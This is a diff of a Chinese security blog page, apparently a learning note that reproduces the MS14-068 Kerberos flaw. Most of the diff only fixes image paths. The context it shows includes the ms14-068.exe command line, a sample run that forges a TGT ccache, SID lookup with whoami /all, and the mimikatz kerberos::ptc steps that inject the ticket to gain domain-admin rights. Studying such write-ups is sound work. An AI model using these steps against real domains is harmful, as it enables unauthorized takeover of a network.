@@ -16,16 +16,16 @@
 <meta property="og:site_name" content="3Npeople">
 <meta property="og:description" content="这个漏洞在当时影响力还是挺大，虽然现在在内网中出现的次数可能很少了，但是对于我们后辈来说还是值得学习下的如果哪天在内网中遇到了呢，也不慌至少有个笔记在，当时出这个漏洞的时候我还没有接触安全，所以来个笔记。 漏洞危害">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/MS16-068复现/1.png">
-<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/MS16-068复现/2.png">
-<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/MS16-068复现/3.png">
-<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/MS16-068复现/4.png">
-<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/MS16-068复现/5.png">
-<meta property="og:updated_time" content="2018-05-30T06:17:24.050Z">
+<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/05/30/MS16-068复现/5.png">
+<meta property="og:updated_time" content="2018-06-06T12:38:28.367Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MS14-068复现">
 <meta name="twitter:description" content="这个漏洞在当时影响力还是挺大，虽然现在在内网中出现的次数可能很少了，但是对于我们后辈来说还是值得学习下的如果哪天在内网中遇到了呢，也不慌至少有个笔记在，当时出这个漏洞的时候我还没有接触安全，所以来个笔记。 漏洞危害">
-<meta name="twitter:image" content="http://yoursite.com/2018/05/30/MS16-068复现/MS16-068复现/1.png">
+<meta name="twitter:image" content="http://yoursite.com/2018/05/30/MS16-068复现/1.png">
   
     <link rel="alternative" href="/atom.xml" title="3Npeople" type="application/atom+xml">
   
@@ -215,14 +215,14 @@
 <h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><p>   ms14-068.exe<br>   Mimikatz2.0以上版本</p>
 <h2 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h2><h3 id="ms14-068-工具使用"><a href="#ms14-068-工具使用" class="headerlink" title="ms14-068 工具使用"></a>ms14-068 工具使用</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt;MS14-068.exe</span><br><span class="line">USAGE:</span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">   -p &lt;clearPassword&gt;</span><br><span class="line">	--rc4 &lt;ntlmHash&gt;</span><br><span class="line"></span><br><span class="line">-u  域成员名@域名</span><br><span class="line">-s  域成员sid</span><br><span class="line">-d  域控制器地址</span><br><span class="line">-p  域成员密码</span><br></pre></td></tr></table></figure>
 </code></pre><p>如果操作正确，且域机器是可以和域控制器互通则会创建.ccache文件</p>
-<p><img src="MS16-068复现\1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt;MS14-068.exe -u user@www.ms.com -s S-1-5-21-198560613-2030</span><br><span class="line">144637-960732988-1106 -d www.ms.com</span><br><span class="line">Password:</span><br><span class="line">  [+] Building AS-REQ for www.ms.com... Done!</span><br><span class="line">  [+] Sending AS-REQ to www.ms.com... Done!</span><br><span class="line">  [+] Receiving AS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Parsing AS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Building TGS-REQ for www.ms.com... Done!</span><br><span class="line">  [+] Sending TGS-REQ to www.ms.com... Done!</span><br><span class="line">  [+] Receiving TGS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Parsing TGS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Creating ccache file &apos;TGT_user@www.ms.com.ccache&apos;... Done!</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2018/05/30/MS16-068复现/1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user\Desktop&gt;MS14-068.exe -u user@www.ms.com -s S-1-5-21-198560613-2030</span><br><span class="line">144637-960732988-1106 -d www.ms.com</span><br><span class="line">Password:</span><br><span class="line">  [+] Building AS-REQ for www.ms.com... Done!</span><br><span class="line">  [+] Sending AS-REQ to www.ms.com... Done!</span><br><span class="line">  [+] Receiving AS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Parsing AS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Building TGS-REQ for www.ms.com... Done!</span><br><span class="line">  [+] Sending TGS-REQ to www.ms.com... Done!</span><br><span class="line">  [+] Receiving TGS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Parsing TGS-REP from www.ms.com... Done!</span><br><span class="line">  [+] Creating ccache file &apos;TGT_user@www.ms.com.ccache&apos;... Done!</span><br></pre></td></tr></table></figure></p>
 <p>域成员密码错误情况图</p>
-<p><img src="MS16-068复现\2.png" alt=""></p>
+<p><img src="/2018/05/30/MS16-068复现/2.png" alt=""></p>
 <p>获取域成员sid方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line">用户    sid</span><br></pre></td></tr></table></figure></p>
 <h2 id="票据注入"><a href="#票据注入" class="headerlink" title="票据注入"></a>票据注入</h2><p>使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge      //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz # kerberos::list          //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc 票据文件         //将票据注入到内存中</span><br></pre></td></tr></table></figure></p>
-<h4 id="票据注入前的测试"><a href="#票据注入前的测试" class="headerlink" title="票据注入前的测试"></a>票据注入前的测试</h4><p><img src="MS16-068复现\3.png" alt=""></p>
-<h4 id="票据注入后的测试"><a href="#票据注入后的测试" class="headerlink" title="票据注入后的测试"></a>票据注入后的测试</h4><p><img src="MS16-068复现\4.png" alt=""></p>
-<p><img src="MS16-068复现\5.png" alt=""></p>
+<h4 id="票据注入前的测试"><a href="#票据注入前的测试" class="headerlink" title="票据注入前的测试"></a>票据注入前的测试</h4><p><img src="/2018/05/30/MS16-068复现/3.png" alt=""></p>
+<h4 id="票据注入后的测试"><a href="#票据注入后的测试" class="headerlink" title="票据注入后的测试"></a>票据注入后的测试</h4><p><img src="/2018/05/30/MS16-068复现/4.png" alt=""></p>
+<p><img src="/2018/05/30/MS16-068复现/5.png" alt=""></p>
 <h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
 <li>注入票据时，机器不能是03或xp，因为mimikatz不支持这两个机器注入，听大佬说过有工具可以注入，希望有知道的朋友可以@me</li>
 <li>当获取到域用户、域用户sid、密码以及可访问到域控制器的机器，并不需要机器一定在域中（如攻击者通过vpn等拨入内网），但需要把dns指向域控制器才能解析</li>
@@ -237,6 +237,15 @@
   
     
 <nav id="article-nav">
+  
+    <a href="/2018/06/06/域内信息收集/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          域内信息收集
+        
+      </div>
+    </a>
   
   
     <a href="/2018/05/25/几年安全学习经验杂谈/" id="article-nav-older" class="article-nav-link-wrap">
